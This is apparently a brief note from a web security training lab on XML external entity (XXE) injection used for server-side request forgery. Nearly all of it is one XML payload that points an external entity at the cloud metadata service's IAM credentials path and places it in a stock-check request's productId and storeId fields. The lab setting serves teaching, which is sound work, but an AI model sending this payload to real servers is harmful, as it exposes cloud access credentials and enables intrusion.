# Lab: Exploiting XXE to perform SSRF attacks
Insert the server responses to the XML SSRF to the URL
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>
&xxe;</storeId></stockCheck>
```

